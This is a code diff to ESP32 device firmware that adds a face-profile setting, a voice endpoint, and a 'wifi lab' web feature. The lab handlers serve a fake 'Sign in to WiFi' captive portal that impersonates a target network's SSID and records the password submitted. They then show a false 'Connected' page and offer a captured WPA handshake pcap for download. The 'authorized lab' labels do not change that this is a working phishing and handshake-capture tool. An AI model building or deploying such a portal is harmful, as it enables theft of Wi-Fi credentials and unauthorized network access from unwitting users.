@@ -18,7 +18,10 @@
 #include "faculty175_ble.h"
 #include "faculty175_board.h"
 #include "faculty175_device_settings.h"
+#include "faculty175_face_profile.h"
 #include "faculty175_faces.h"
+#include "faculty175_serial.h"
+#include "faculty175_wifi_lab.h"
 #include "faculty175_wifi_monitor.h"
 #include "faculty175_wifi_settings.h"
 
@@ -516,6 +519,7 @@ static esp_err_t api_settings_send(httpd_req_t *req, esp_err_t apply_err)
     }
     cJSON_AddBoolToObject(root, "ok", apply_err == ESP_OK);
     add_json_string(root, "err", esp_err_to_name(apply_err));
+    add_json_string(root, "profile", faculty175_face_profile_slug(faculty175_face_profile_current()));
 
     cJSON *wifi = cJSON_AddObjectToObject(root, "wifi");
     if (wifi != NULL) {
@@ -620,6 +624,16 @@ static esp_err_t api_settings_post(httpd_req_t *req)
         }
     }
 
+    const cJSON *profile = cJSON_GetObjectItemCaseSensitive(root, "profile");
+    if (err == ESP_OK && cJSON_IsString(profile) && profile->valuestring != NULL && profile->valuestring[0] != '\0') {
+        faculty175_face_profile_t profile_id;
+        if (faculty175_face_profile_from_slug(profile->valuestring, &profile_id)) {
+            err = faculty175_face_profile_apply(profile_id, true);
+        } else {
+            err = ESP_ERR_INVALID_ARG;
+        }
+    }
+
     const cJSON *wifi = cJSON_GetObjectItemCaseSensitive(root, "wifi");
     if (err == ESP_OK && cJSON_IsObject(wifi)) {
         const cJSON *travel_router = cJSON_GetObjectItemCaseSensitive(wifi, "travelRouter");
@@ -715,6 +729,123 @@ static esp_err_t api_wifi_incidents_get(httpd_req_t *req)
     return err;
 }
 
+static esp_err_t lab_portal_get(httpd_req_t *req)
+{
+    faculty175_wifi_lab_state_t state = {};
+    faculty175_wifi_lab_get_state(&state);
+    const char *ssid = state.target_ssid[0] != '\0' ? state.target_ssid : "WiFi Network";
+    char body[2048];
+    snprintf(body,
+             sizeof(body),
+             "<!doctype html><html><head><meta charset=\"utf-8\"><meta name=\"viewport\" "
+             "content=\"width=device-width,initial-scale=1\"><title>%s</title>"
+             "<style>body{margin:0;background:#eef2f7;color:#1a2433;font-family:system-ui,sans-serif}"
+             "main{max-width:24rem;margin:48px auto;padding:24px;background:#fff;border-radius:12px;"
+             "box-shadow:0 8px 24px rgba(0,0,0,.08)}input,button{box-sizing:border-box;width:100%%;"
+             "font:inherit;padding:12px;margin:8px 0;border-radius:8px;border:1px solid #c7d0dc}"
+             "button{background:#007aff;color:#fff;border:0;font-weight:700}.muted{color:#667085;font-size:.9rem}"
+             "</style></head><body><main>"
+             "<h1>Sign in to WiFi</h1>"
+             "<p class=\"muted\">Enter your credentials to connect to <strong>%s</strong>.</p>"
+             "<form method=\"post\" action=\"/lab/portal\">"
+             "<input type=\"hidden\" name=\"ssid\" value=\"%s\">"
+             "<label>Email or username<input name=\"username\" maxlength=\"64\" autocomplete=\"username\"></label>"
+             "<label>Password<input name=\"password\" maxlength=\"64\" type=\"password\" autocomplete=\"current-password\"></label>"
+             "<button type=\"submit\">Connect</button></form>"
+             "<p class=\"muted\">Authorized lab capture only.</p>"
+             "</main></body></html>",
+             ssid,
+             ssid,
+             ssid);
+    httpd_resp_set_type(req, "text/html");
+    return httpd_resp_send(req, body, HTTPD_RESP_USE_STRLEN);
+}
+
+static esp_err_t lab_portal_post(httpd_req_t *req)
+{
+    char body[384];
+    esp_err_t err = read_request_body(req, body, sizeof(body));
+    if (err != ESP_OK) {
+        return err;
+    }
+
+    char username[68];
+    char password[68];
+    char ssid[36];
+    form_value(body, "username", username, sizeof(username));
+    if (username[0] == '\0') {
+        form_value(body, "email", username, sizeof(username));
+    }
+    form_value(body, "password", password, sizeof(password));
+    form_value(body, "ssid", ssid, sizeof(ssid));
+
+    faculty175_wifi_lab_state_t state = {};
+    faculty175_wifi_lab_get_state(&state);
+    const char *cred_ssid = ssid[0] != '\0' ? ssid
+                                                 : (state.target_ssid[0] != '\0' ? state.target_ssid : "unknown");
+    faculty175_wifi_lab_record_capture(cred_ssid, password);
+
+    char success[768];
+    snprintf(success,
+             sizeof(success),
+             "<!doctype html><html><head><meta charset=\"utf-8\"><meta name=\"viewport\" "
+             "content=\"width=device-width,initial-scale=1\"><title>Connected</title>"
+             "<style>body{margin:0;background:#eef2f7;color:#1a2433;font-family:system-ui,sans-serif}"
+             "main{max-width:24rem;margin:48px auto;padding:24px;background:#fff;border-radius:12px;"
+             "box-shadow:0 8px 24px rgba(0,0,0,.08)}.muted{color:#667085}</style></head><body><main>"
+             "<h1>Connected</h1><p>Your device should reconnect to <strong>%s</strong> shortly.</p>"
+             "<p class=\"muted\">Captured for authorized lab review.</p>"
+             "</main></body></html>",
+             cred_ssid);
+    httpd_resp_set_type(req, "text/html");
+    return httpd_resp_send(req, success, HTTPD_RESP_USE_STRLEN);
+}
+
+static esp_err_t lab_handshake_pcap_get(httpd_req_t *req)
+{
+    FILE *f = fopen(FACULTY175_WIFI_LAB_PCAP_PATH, "rb");
+    if (f == NULL) {
+        httpd_resp_send_err(req, HTTPD_404_NOT_FOUND, "no handshake pcap yet");
+        return ESP_FAIL;
+    }
+    if (fseek(f, 0, SEEK_END) != 0) {
+        fclose(f);
+        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "pcap seek");
+        return ESP_FAIL;
+    }
+    const long size = ftell(f);
+    if (size <= 0 || size > (512 * 1024)) {
+        fclose(f);
+        httpd_resp_send_err(req, HTTPD_404_NOT_FOUND, "pcap empty");
+        return ESP_FAIL;
+    }
+    if (fseek(f, 0, SEEK_SET) != 0) {
+        fclose(f);
+        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "pcap seek");
+        return ESP_FAIL;
+    }
+
+    uint8_t *buf = (uint8_t *)malloc((size_t)size);
+    if (buf == NULL) {
+        fclose(f);
+        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "pcap alloc");
+        return ESP_FAIL;
+    }
+    const size_t got = fread(buf, 1, (size_t)size, f);
+    fclose(f);
+    if (got != (size_t)size) {
+        free(buf);
+        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "pcap read");
+        return ESP_FAIL;
+    }
+
+    httpd_resp_set_type(req, "application/vnd.tcpdump.pcap");
+    httpd_resp_set_hdr(req, "Content-Disposition", "attachment; filename=\"handshake.pcap\"");
+    const esp_err_t err = httpd_resp_send(req, (const char *)buf, (size_t)size);
+    free(buf);
+    return err;
+}
+
 static esp_err_t api_face_get(httpd_req_t *req)
 {
     char query[96] = {};
@@ -769,6 +900,70 @@ static esp_err_t api_face_post(httpd_req_t *req)
     return api_face_reply(req, faculty175_faces_current(), set_us, err);
 }
 
+static esp_err_t api_voice_post(httpd_req_t *req)
+{
+    char body[192];
+    const esp_err_t read_err = read_request_body(req, body, sizeof(body));
+    if (read_err != ESP_OK) {
+        return read_err;
+    }
+
+    char action[16] = {};
+    form_value(body, "action", action, sizeof(action));
+    if (action[0] == '\0') {
+        json_value(body, "action", action, sizeof(action));
+    }
+    if (action[0] == '\0') {
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "action required");
+        return ESP_FAIL;
+    }
+
+    esp_err_t err = ESP_OK;
+    bool accepted = false;
+    if (strcasecmp(action, "tts") == 0 || strcasecmp(action, "read") == 0) {
+        accepted = faculty175_request_current_face_tts();
+        err = accepted ? ESP_OK : ESP_FAIL;
+    } else if (strcasecmp(action, "stt") == 0 || strcasecmp(action, "capture") == 0) {
+        uint32_t capture_ms = 9000;
+        char ms_text[16] = {};
+        form_value(body, "ms", ms_text, sizeof(ms_text));
+        if (ms_text[0] == '\0') {
+            json_value(body, "ms", ms_text, sizeof(ms_text));
+        }
+        if (ms_text[0] != '\0') {
+            const unsigned long parsed = strtoul(ms_text, NULL, 10);
+            if (parsed >= 1000 && parsed <= 30000) {
+                capture_ms = (uint32_t)parsed;
+            }
+        }
+        err = faculty175_request_qa_stt(capture_ms);
+        accepted = err == ESP_OK;
+    } else {
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "unknown action");
+        return ESP_FAIL;
+    }
+
+    cJSON *root = cJSON_CreateObject();
+    if (root == NULL) {
+        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "json alloc");
+        return ESP_FAIL;
+    }
+    cJSON_AddBoolToObject(root, "ok", err == ESP_OK);
+    cJSON_AddBoolToObject(root, "accepted", accepted);
+    add_json_string(root, "action", action);
+    add_json_string(root, "err", esp_err_to_name(err));
+    char *reply = cJSON_PrintUnformatted(root);
+    cJSON_Delete(root);
+    if (reply == NULL) {
+        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "json print");
+        return ESP_FAIL;
+    }
+    set_api_headers(req);
+    esp_err_t send_err = httpd_resp_send(req, reply, HTTPD_RESP_USE_STRLEN);
+    free(reply);
+    return send_err;
+}
+
 static esp_err_t screen_bmp_get(httpd_req_t *req)
 {
     char len[24];
@@ -800,7 +995,7 @@ esp_err_t faculty175_screen_http_start(const esp_ip4_addr_t *ip)
     config.server_port = 80;
     config.stack_size = 8192;
     config.max_open_sockets = 4;
-    config.max_uri_handlers = 12;
+    config.max_uri_handlers = 16;
     config.lru_purge_enable = true;
 
     esp_err_t err = httpd_start(&s_httpd, &config);
@@ -857,6 +1052,12 @@ esp_err_t faculty175_screen_http_start(const esp_ip4_addr_t *ip)
         .handler = api_face_post,
         .user_ctx = NULL,
     };
+    const httpd_uri_t api_voice_post_uri = {
+        .uri = "/api/voice",
+        .method = HTTP_POST,
+        .handler = api_voice_post,
+        .user_ctx = NULL,
+    };
     const httpd_uri_t api_settings_get_uri = {
         .uri = "/api/settings",
         .method = HTTP_GET,
@@ -875,6 +1076,24 @@ esp_err_t faculty175_screen_http_start(const esp_ip4_addr_t *ip)
         .handler = api_options,
         .user_ctx = NULL,
     };
+    const httpd_uri_t lab_portal_get_uri = {
+        .uri = "/lab/portal",
+        .method = HTTP_GET,
+        .handler = lab_portal_get,
+        .user_ctx = NULL,
+    };
+    const httpd_uri_t lab_portal_post_uri = {
+        .uri = "/lab/portal",
+        .method = HTTP_POST,
+        .handler = lab_portal_post,
+        .user_ctx = NULL,
+    };
+    const httpd_uri_t lab_handshake_pcap_uri = {
+        .uri = "/lab/handshake.pcap",
+        .method = HTTP_GET,
+        .handler = lab_handshake_pcap_get,
+        .user_ctx = NULL,
+    };
     const httpd_uri_t api_wifi_incidents_uri = {
         .uri = "/api/wifi/incidents",
         .method = HTTP_GET,
@@ -889,9 +1108,13 @@ esp_err_t faculty175_screen_http_start(const esp_ip4_addr_t *ip)
     ESP_RETURN_ON_ERROR(httpd_register_uri_handler(s_httpd, &api_faces_uri), TAG, "register GET /api/faces");
     ESP_RETURN_ON_ERROR(httpd_register_uri_handler(s_httpd, &api_face_get_uri), TAG, "register GET /api/face");
     ESP_RETURN_ON_ERROR(httpd_register_uri_handler(s_httpd, &api_face_post_uri), TAG, "register POST /api/face");
+    ESP_RETURN_ON_ERROR(httpd_register_uri_handler(s_httpd, &api_voice_post_uri), TAG, "register POST /api/voice");
     ESP_RETURN_ON_ERROR(httpd_register_uri_handler(s_httpd, &api_settings_get_uri), TAG, "register GET /api/settings");
     ESP_RETURN_ON_ERROR(httpd_register_uri_handler(s_httpd, &api_settings_post_uri), TAG, "register POST /api/settings");
     ESP_RETURN_ON_ERROR(httpd_register_uri_handler(s_httpd, &api_settings_options_uri), TAG, "register OPTIONS /api/settings");
+    ESP_RETURN_ON_ERROR(httpd_register_uri_handler(s_httpd, &lab_portal_get_uri), TAG, "register GET /lab/portal");
+    ESP_RETURN_ON_ERROR(httpd_register_uri_handler(s_httpd, &lab_portal_post_uri), TAG, "register POST /lab/portal");
+    ESP_RETURN_ON_ERROR(httpd_register_uri_handler(s_httpd, &lab_handshake_pcap_uri), TAG, "register GET /lab/handshake.pcap");
     ESP_RETURN_ON_ERROR(httpd_register_uri_handler(s_httpd, &api_wifi_incidents_uri), TAG, "register GET /api/wifi/incidents");
 
     ESP_LOGI(TAG, "ready http://" IPSTR "/ (GET /screen.bmp, /wifi, /api/faces)", IP2STR(&s_ip));
